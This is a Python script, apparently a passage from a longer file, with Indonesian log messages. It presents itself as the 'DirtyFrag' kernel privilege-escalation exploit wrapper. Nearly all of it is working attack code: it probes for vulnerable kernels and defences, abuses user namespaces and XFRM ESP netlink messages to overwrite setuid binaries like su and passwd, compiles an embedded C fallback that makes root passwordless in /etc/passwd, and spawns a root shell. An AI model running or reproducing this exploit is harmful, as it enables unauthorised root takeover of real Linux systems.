    parts = ver.split("-")[0].split(".")
    try:
        major = int(parts[0])
        minor = int(parts[1]) if len(parts) > 1 else 0
        return major, minor, ver
    except Exception:
        return 0, 0, ver

def is_vulnerable_kernel():
    major, minor, ver = get_kernel_version()
    INFO("Versi kernel terdeteksi: %s", ver)
    if major < 4:
        return False
    if major == 4 and minor < 10:
        return False
    if major > 7:
        return False
    return True

def check_modules():
    mods = {"esp4": False, "esp6": False, "rxrpc": False}
    try:
        with open("/proc/modules") as f:
            content = f.read()
        for m in mods:
            if m + " " in content:
                mods[m] = True
    except Exception:
        pass
    return mods

def is_module_blacklisted(mod):
    paths = ["/etc/modprobe.d/", "/lib/modprobe.d/", "/run/modprobe.d/", "/usr/lib/modprobe.d/"]
    for d in paths:
        if not os.path.isdir(d):
            continue
        try:
            for fname in os.listdir(d):
                fpath = os.path.join(d, fname)
                try:
                    with open(fpath, "r") as f:
                        content = f.read()
                    if mod in content and ("blacklist" in content or "/bin/false" in content or "install" in content):
                        return True
                except Exception:
                    continue
        except Exception:
            continue
    return False

def check_userns():
    try:
        with open("/proc/sys/kernel/unprivileged_userns_clone", "r") as f:
            return f.read().strip() == "1"
    except Exception:
        return True

def check_apparmor():
    try:
        rc = subprocess.run("aa-status --enabled 2>/dev/null || echo no",
                            shell=True, capture_output=True, text=True)
        return "no" not in rc.stdout.lower() and rc.returncode == 0
    except Exception:
        return False

def check_selinux():
    try:
        rc = subprocess.run("getenforce 2>/dev/null", shell=True, capture_output=True, text=True)
        return rc.stdout.strip().lower() in ("enforcing", "permissive")
    except Exception:
        return False

def check_container():
    if os.path.exists("/.dockerenv"):
        return True
    try:
        with open("/proc/1/cgroup", "r") as f:
            return "docker" in f.read() or "lxc" in f.read() or "containerd" in f.read()
    except Exception:
        return False

def find_setuid_targets():
    search_paths = ["/usr/bin", "/bin", "/usr/sbin", "/sbin"]
    preferred = ["passwd", "su"]
    targets = []
    for d in search_paths:
        for name in preferred:
            p = os.path.join(d, name)
            if os.path.isfile(p) and os.access(p, os.X_OK):
                try:
                    st = os.stat(p)
                    if st.st_mode & 0o4000:
                        targets.append(p)
                except Exception:
                    continue
    if not targets:
        for d in search_paths:
            try:
                for entry in os.listdir(d):
                    p = os.path.join(d, entry)
                    if os.path.isfile(p) and os.access(p, os.X_OK):
                        st = os.stat(p)
                        if st.st_mode & 0o4000 and st.st_size > 200:
                            targets.append(p)
            except Exception:
                continue
    seen = set()
    uniq = []
    for t in targets:
        if t not in seen:
            seen.add(t)
            uniq.append(t)
    return uniq

def find_su_path():
    for p in ["/usr/bin/su", "/bin/su", "/sbin/su", "/usr/sbin/su"]:
        if os.path.isfile(p) and os.access(p, os.X_OK):
            return p
    targets = find_setuid_targets()
    for t in targets:
        if t.endswith("/su"):
            return t
    return None

def try_load_module(mod):
    try:
        subprocess.run(f"modprobe {mod} 2>/dev/null", shell=True, timeout=10)
    except Exception:
        pass

# ===================== PURE PYTHON ESP EXPLOIT =====================

def _ifup_lo():
    s = socket.socket(AF_INET, SOCK_DGRAM, 0)
    import array
    ifr = array.array('B', b'\x00' * 40)
    ifr[:2] = array.array('B', b'lo')
    fcntl.ioctl(s.fileno(), 0x8913, ifr)
    flags = struct.unpack_from('<H', ifr, 16)[0]
    struct.pack_into('<H', ifr, 16, flags | 0x41)
    fcntl.ioctl(s.fileno(), 0x8914, ifr)
    s.close()

def _setup_userns():
    uid, gid = os.getuid(), os.getgid()
    sys_unshare(CLONE_NEWUSER | CLONE_NEWNET)
    with open("/proc/self/setgroups", 'w') as f:
        f.write("deny")
    with open("/proc/self/uid_map", 'w') as f:
        f.write(f"0 {uid} 1")
    with open("/proc/self/gid_map", 'w') as f:
        f.write(f"0 {gid} 1")
    _ifup_lo()

def _nl_attr(buf, off, atype, data):
    dl = len(data)
    rta_len = 4 + dl
    rta_aligned = (rta_len + 3) & ~3
    struct.pack_into('<HH', buf, off, rta_len, atype)
    buf[off+4:off+4+dl] = data
    pad = rta_aligned - 4 - dl
    if pad > 0:
        buf[off+4+dl:off+4+dl+pad] = b'\x00' * pad
    return off + rta_aligned

def _add_xfrm_sa(spi, seqhi):
    sk = socket.socket(AF_NETLINK, socket.SOCK_RAW, NETLINK_XFRM)
    sk.bind((0, 0))
    buf = bytearray(4096)
    lo = struct.unpack("<I", socket.inet_aton("127.0.0.1"))[0]
    xs_sz = 224
    struct.pack_into('<IHHII', buf, 0, 16 + xs_sz, XFRM_MSG_NEWSA,
                     NLM_F_REQUEST | NLM_F_ACK | 0x200, os.getpid(), 1)
    o = 16
    struct.pack_into('<IIBBBBIIQQQQIIII', buf, o,
                     socket.ntohl(lo), socket.ntohl(lo), IPPROTO_ESP, 0, 0, 0, 0, 0,
                     0, 0, 0, spi, 0, 0, XFRM_MODE_TRANSPORT, 0, 0, 0)
    a = 16 + xs_sz
    aa = bytearray(72 + 32)
    n = b"hmac(sha256)\0"
    aa[:len(n)] = n
    struct.pack_into('<I', aa, 64, 256)
    struct.pack_into('<I', aa, 68, 128)
    for i in range(32):
        aa[72+i] = 0xAA
    a = _nl_attr(buf, a, XFRMA_ALG_AUTH_TRUNC, bytes(aa))
    ea = bytearray(68 + 16)
    n2 = b"cbc(aes)\0"
    ea[:len(n2)] = n2
    struct.pack_into('<I', ea, 64, 128)
    for i in range(16):
        ea[68+i] = 0xBB
    a = _nl_attr(buf, a, XFRMA_ALG_CRYPT, bytes(ea))
    enc = bytearray(24)
    struct.pack_into('<H', enc, 0, UDP_ENCAP_ESPINUDP)
    struct.pack_into('>HH', enc, 2, ENC_PORT, ENC_PORT)
    a = _nl_attr(buf, a, XFRMA_ENCAP, bytes(enc))
    esn = bytearray(28)
    struct.pack_into('<IIIIIII', esn, 0, 1, 0, REPLAY_SEQ, 0, seqhi, 32, 0)
    a = _nl_attr(buf, a, XFRMA_REPLAY_ESN_VAL, bytes(esn))
    struct.pack_into('<I', buf, 0, a)
    sk.sendall(bytes(buf[:a]))
    resp = sk.recv(4096)
    sk.close()
    if len(resp) >= 20:
        if struct.unpack_from('<H', resp, 4)[0] == 2:
            err = struct.unpack_from('<i', resp, 16)[0]
            if err != 0:
                DBG("xfrm NEWSA error: %d", -err)
                return False
    return True

def _do_write(path, offset, spi):
    sk_r = socket.socket(AF_INET, socket.SOCK_DGRAM, 0)
    sk_r.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sk_r.bind(("127.0.0.1", ENC_PORT))
    sk_r.setsockopt(IPPROTO_UDP, UDP_ENCAP, struct.pack('<I', UDP_ENCAP_ESPINUDP))
    sk_s = socket.socket(AF_INET, socket.SOCK_DGRAM, 0)
    sk_s.connect(("127.0.0.1", ENC_PORT))
    try:
        fd = os.open(path, os.O_RDONLY)
    except PermissionError:
        WARN("Cannot open %s for reading", path)
        return False
    r, w = os.pipe()
    hdr = struct.pack('>II', spi, SEQ_VAL) + b'\xCC' * 16
    os.write(w, hdr)
    _raw_splice(fd, offset, w, None, 16, 0)
    try:
        _raw_splice(r, None, sk_s.fileno(), None, 40, 0)
    except OSError:
        pass
    time.sleep(0.15)
    os.close(fd)
    os.close(r)
    os.close(w)
    sk_s.close()
    sk_r.close()
    return True

def _corrupt_binary(target_path):
    _setup_userns()
    time.sleep(0.1)
    for i in range(PAYLOAD_LEN // 4):
        spi = 0xDEADBE10 + i
        sq = ((SHELL_ELF[i*4] << 24) | (SHELL_ELF[i*4+1] << 16) |
              (SHELL_ELF[i*4+2] << 8) | SHELL_ELF[i*4+3])
        if not _add_xfrm_sa(spi, sq):
            DBG("add_xfrm_sa #%d failed", i)
            return False
    for i in range(PAYLOAD_LEN // 4):
        if not _do_write(target_path, PATCH_OFFSET + i * 4, 0xDEADBE10 + i):
            DBG("do_write #%d failed", i)
            return False
    return True

def binary_patched(target_path):
    try:
        fd = os.open(target_path, os.O_RDONLY)
        got = os.pread(fd, 8, ENTRY_OFFSET)
        os.close(fd)
        return got == PASSWD_MARKER
    except OSError:
        return False

def lpe_main(target_path):
    pid = os.fork()
    if pid == 0:
        os._exit(0 if _corrupt_binary(target_path) else 2)
    _, st = os.waitpid(pid, 0)
    return os.WEXITSTATUS(st) == 0

# ===================== PTY BRIDGE (dari referensi) =====================

def _run_pty():
    master, slave = pty.openpty()
    try:
        try:
            ws = fcntl.ioctl(sys.stdin.fileno(), termios.TIOCGWINSZ, b'\x00'*8)
            fcntl.ioctl(master, termios.TIOCSWINSZ, ws)
        except OSError:
            pass
        pid = os.fork()
        if pid == 0:
            os.close(master)
            os.setsid()
            sf = os.open(os.ttyname(slave), os.O_RDWR)
            os.close(slave)
            try:
                fcntl.ioctl(sf, termios.TIOCSCTTY, 0)
            except OSError:
                pass
            os.dup2(sf, 0)
            os.dup2(sf, 1)
            os.dup2(sf, 2)
            if sf > 2:
                os.close(sf)
            for p in ("/usr/bin/passwd", "/bin/passwd", "/usr/bin/su", "/bin/su"):
                try:
                    os.execv(p, [p, "-"])
                except (FileNotFoundError, PermissionError):
                    continue
            os.execvp("sh", ["sh"])
            os._exit(127)
        os.close(slave)
        signal.signal(signal.SIGTTOU, signal.SIG_IGN)
        signal.signal(signal.SIGTTIN, signal.SIG_IGN)
        signal.signal(signal.SIGPIPE, signal.SIG_IGN)
        signal.signal(signal.SIGHUP, signal.SIG_IGN)
        restore = False
        saved = None
        try:
            saved = termios.tcgetattr(sys.stdin.fileno())
            tty.setraw(sys.stdin.fileno())
            restore = True
        except termios.error:
            pass
        pw_sent = False
        eof = False
        saw = False
        tms = 0
        while True:
            fds = []
            if not eof:
                try:
                    fds.append(sys.stdin.fileno())
                except OSError:
                    eof = True
            fds.append(master)
            try:
                r, _, _ = select.select(fds, [], [], 0.2)
            except (OSError, ValueError):
                break
            tms += 200
            if master in r:
                try:
                    data = os.read(master, 4096)
                except OSError:
                    break
                if not data:
                    break
                saw = True
                os.write(sys.stdout.fileno(), data)
                if not pw_sent and len(data) < 4096:
                    if b'Password' in data or b'password' in data or b'passwd' in data:
                        os.write(master, b'\n')
                        pw_sent = True
            if not eof and sys.stdin.fileno() in r:
                try:
                    data = os.read(sys.stdin.fileno(), 4096)
                except OSError:
                    eof = True
                else:
                    if not data:
                        eof = True
                    else:
                        os.write(master, data)
            if not pw_sent and not saw and tms >= 1500:
                os.write(master, b'\n')
                pw_sent = True
            try:
                wp, st = os.waitpid(pid, os.WNOHANG)
                if wp == pid:
                    for _ in range(5):
                        try:
                            r2, _, _ = select.select([master], [], [], 0.05)
                            if not r2:
                                break
                            d = os.read(master, 4096)
                            if not d:
                                break
                            os.write(sys.stdout.fileno(), d)
                        except OSError:
                            break
                    break
            except ChildProcessError:
                break
        if restore and saved:
            termios.tcsetattr(sys.stdin.fileno(), termios.TCSANOW, saved)
        os.close(master)
    except Exception as e:
        WARN("PTY: %s", e)
        return False
    return True

def spawn_target_shell(target):
    INFO("Eksekusi target korupsi langsung: %s", target)
    os.execl(target, target, "-")

# ===================== RXRPC FALLBACK (Embedded C) =====================

def get_safe_workdir():
    candidates = ["/dev/shm", os.path.expanduser("~"), "/var/tmp", os.getcwd()]
    for d in candidates:
        if os.path.isdir(d) and os.access(d, os.W_OK | os.X_OK):
            try:
                testf = os.path.join(d, ".df_wt_" + str(os.getpid()))
                with open(testf, "w") as f:
                    f.write("t")
                os.chmod(testf, 0o755)
                os.remove(testf)
                return d
            except Exception:
                continue
    return "/dev/shm"

def extract_c_source(target_path):
    raw = base64.b64decode(EMBEDDED_C)
    src = zlib.decompress(raw).decode("utf-8")
    src = src.replace('#define TARGET_PATH      "/usr/bin/su"',
                      f'#define TARGET_PATH      "{target_path}"')
    return src

def compile_c_source(src, out_path):
    fd, src_path = tempfile.mkstemp(suffix=".c", prefix="df_", dir=get_safe_workdir())
    try:
        os.write(fd, src.encode("utf-8"))
    finally:
        os.close(fd)
    cc = shutil.which("gcc") or shutil.which("cc")
    if not cc:
        WARN("Compiler gcc/cc tidak ditemukan")
        return None, src_path
    cmd = [cc, "-O0", "-Wall", "-o", out_path, src_path, "-lutil"]
    INFO("Kompilasi: %s", " ".join(cmd))
    rc = subprocess.run(" ".join(cmd), shell=True, capture_output=True, text=True, timeout=60)
    if rc.returncode != 0:
        WARN("Kompilasi gagal: %s", rc.stderr[:500] if rc.stderr else rc.stdout[:500])
        return None, src_path
    os.chmod(out_path, 0o755)
    return out_path, src_path

def run_c_exploit(binary, mode="auto"):
    env = os.environ.copy()
    args = [binary]
    if mode == "esp":
        args.append("--force-esp")
    elif mode == "rxrpc":
        args.append("--force-rxrpc")
    INFO("Menjalankan exploit C: %s", " ".join(args))
    try:
        p = subprocess.Popen(args, env=env)
        p.wait(timeout=60)
        return p.returncode
    except (PermissionError, OSError) as e:
        WARN("Permission denied saat menjalankan binary: %s", e)
        alt = os.path.join(get_safe_workdir(), os.path.basename(binary) + "_alt")
        try:
            shutil.copy2(binary, alt)
            os.chmod(alt, 0o755)
            args[0] = alt
            p = subprocess.Popen(args, env=env)
            p.wait(timeout=60)
            return p.returncode
        except Exception as e2:
            WARN("Retry gagal: %s", e2)
            return -1
    except subprocess.TimeoutExpired:
        WARN("Exploit timeout")
        p.kill()
        return -1
    except Exception as e:
        WARN("%s", e)
        return -1

def is_passwd_patched():
    try:
        with open("/etc/passwd", "rb") as f:
            return f.read(9) == b"root::0:0"
    except Exception:
        return False

def run_su_subprocess(su_path):
    try:
        INFO("Menjalankan su - via subprocess...")
        p = subprocess.Popen([su_path, "-"], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, text=True)
        time.sleep(1.0)
        p.stdin.write("\n")
        p.stdin.flush()
        try:
            out = p.communicate(timeout=10)[0]
            sys.stdout.write(out)
        except subprocess.TimeoutExpired:
            p.kill()
        return p.returncode if p.returncode is not None else -1
    except Exception as e:
        WARN("%s", e)
        return -1

def cleanup(paths):
    for p in paths:
        try:
            if os.path.isfile(p):
                os.remove(p)
        except Exception:
            pass

def drop_caches():
    try:
        subprocess.run("echo 3 > /proc/sys/vm/drop_caches", shell=True, timeout=10)
    except Exception:
        pass

# ===================== MAIN =====================

def banner():
    print(r"""
  ____  _      _       __      ___
 |  _ \(_) ___| |_     \ \    / (_) _____      __
 | | | | |/ __| __|     \ \  / /| |/ _ \ \ /\ / /
 | |_| | | (__| |_       \ \/ / | |  __/\ V  V /
 |____/|_|\___|\__|       \__/  |_|\___| \_/\_/
        Smart Python Wrapper - Kernel LPE  v3
""")

def main():
    global VERBOSE
    parser = argparse.ArgumentParser(description="DirtyFrag Smart Exploit Wrapper v3")
    parser.add_argument("--target", default=None, help="Target setuid path (default: auto)")
    parser.add_argument("--target-su", default=None, help="Alias untuk --target")
    parser.add_argument("--target-passwd", default=None, help="Alias untuk --target")
    parser.add_argument("--no-cleanup", action="store_true", help="Jangan hapus file temp")
    parser.add_argument("--drop-caches", action="store_true", help="Drop page cache")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose")
    parser.add_argument("--mode", choices=["auto", "esp", "rxrpc"], default="auto",
                        help="Mode eksploitasi (default: auto)")
    args = parser.parse_args()

    VERBOSE = args.verbose or bool(os.getenv("DIRTYFRAG_VERBOSE"))
    banner()

    if check_root():
        LOG("Sudah root. Spawn shell...")
        os.execlp("/bin/bash", "bash", "-i")
        return

    if not check_arch():
        WARN("Arsitektur tidak didukung. Dibutuhkan x86_64.")
        sys.exit(1)

    if not is_vulnerable_kernel():
        WARN("Kernel mungkin tidak rentan, tetapi tetap mencoba...")

    if check_container():
        WARN("Deteksi container. Eksploitasi kernel tetap mungkin berhasil.")

    mods = check_modules()
    INFO("Modul terdeteksi: esp4=%s, esp6=%s, rxrpc=%s", mods["esp4"], mods["esp6"], mods["rxrpc"])
    INFO("User namespaces: %s", "enabled" if check_userns() else "disabled")

    aa = check_apparmor()
    se = check_selinux()
    if aa:
        WARN("AppArmor aktif.")
    if se:
        WARN("SELinux aktif.")

    for mod in ["esp4", "esp6", "rxrpc"]:
        if not mods[mod] and not is_module_blacklisted(mod):
            INFO("Mencoba load modul %s...", mod)
            try_load_module(mod)
    mods = check_modules()

    # Determine targets
    targets = []
    if args.target:
        targets.append(args.target)
    if args.target_su:
        targets.append(args.target_su)
    if args.target_passwd:
        targets.append(args.target_passwd)
    if not targets:
        # Smart order: passwd first (world-readable), then su variants
        for p in ["/usr/bin/passwd", "/bin/passwd", "/usr/bin/su", "/bin/su"]:
            if os.path.isfile(p) and os.access(p, os.X_OK):
                try:
                    st = os.stat(p)
                    if st.st_mode & 0o4000:
                        targets.append(p)
                except Exception:
                    continue
        if not targets:
            targets = find_setuid_targets()

    INFO("Target setuid yang ditemukan: %s", targets)

    if not targets and args.mode != "rxrpc":
        WARN("Tidak ada target setuid. Beralih ke RxRPC.")
        args.mode = "rxrpc"

    temp_files = []
    success = False

    # ========== FASE 1: Pure Python ESP ==========
    if args.mode in ("auto", "esp"):
        if not mods["esp4"] and not mods["esp6"]:
            WARN("Modul ESP tidak tersedia. ESP path mungkin gagal.")
        for target in targets:
            if success:
                break
            INFO("Mencoba Pure-Python ESP path pada target: %s", target)
            try:
                ok = lpe_main(target)
            except Exception as e:
                WARN("ESP exception: %s", e)
                ok = False
            if ok:
                LOG("ESP exploit selesai.")
                if binary_patched(target):
                    LOG("Target terkonfirmasi terkorupsi: %s", target)
                    if not check_root():
                        # Coba PTY bridge dulu, lalu fallback execl
                        if not _run_pty():
                            spawn_target_shell(target)
                        else:
                            success = True
                    else:
                        success = True
                else:
                    WARN("Tidak dapat memverifikasi korupsi target.")
            elif binary_patched(target):
                LOG("Target terkorupsi meskipun lpe_main rc!=0.")
                if not _run_pty():
                    spawn_target_shell(target)
                else:
                    success = True
            else:
                WARN("ESP path gagal pada %s", target)

    # ========== FASE 2: RxRPC fallback (embedded C) ==========
    if not success and args.mode in ("auto", "rxrpc"):
        if not mods["rxrpc"]:
            WARN("Modul rxrpc tidak tersedia. RxRPC mungkin gagal.")
        INFO("Mencoba RxRPC path...")
        rx_target = targets[0] if targets else "/usr/bin/su"
        src = extract_c_source(rx_target)
        out = tempfile.mktemp(suffix="", prefix=".df_", dir=get_safe_workdir())
        binary, src_path = compile_c_source(src, out)
        if src_path:
            temp_files.append(src_path)
        if binary:
            temp_files.append(binary)
            for attempt in range(3):
                INFO("RxRPC attempt %d/3", attempt + 1)
                rc = run_c_exploit(binary, mode="rxrpc")
                if rc == 0:
                    LOG("Exploit RxRPC selesai (rc=0).")
                    if is_passwd_patched():
                        LOG("/etc/passwd terkorupsi.")
                        if not check_root():
                            su_path = find_su_path()
                            if su_path:
                                run_su_subprocess(su_path)
                            else:
                                WARN("su tidak ditemukan.")
                        else:
                            success = True
                    break
                elif is_passwd_patched():
                    LOG("/etc/passwd terkorupsi meskipun rc!=0.")
                    su_path = find_su_path()
                    if su_path:
                        run_su_subprocess(su_path)
                    else:
                        WARN("su tidak ditemukan.")
                time.sleep(0.5)

    # ========== FASE 3: Fallback brute-force setuid lain ==========
    if not success and args.mode == "auto":
        all_targets = find_setuid_targets()
        for target in all_targets:
            if target in targets:
                continue
            if success:
                break
            INFO("Fallback: mencoba target setuid lain: %s", target)
            try:
                ok = lpe_main(target)
            except Exception as e:
                WARN("ESP exception: %s", e)
                ok = False
            if ok and binary_patched(target):
                LOG("Fallback target terkorupsi: %s", target)
                if not _run_pty():
                    spawn_target_shell(target)
                else:
                    success = True
            elif binary_patched(target):
                if not _run_pty():
                    spawn_target_shell(target)
                else:
                    success = True

    if not args.no_cleanup:
        cleanup(temp_files)
    if args.drop_caches:
        drop_caches()

    if not success and not check_root():
        WARN("Semua jalur eksploitasi gagal.")
        sys.exit(1)

    if check_root():
        LOG("Berhasil mendapatkan root!")
        os.execlp("/bin/bash", "bash", "-i")

if __name__ == "__main__":
    main()
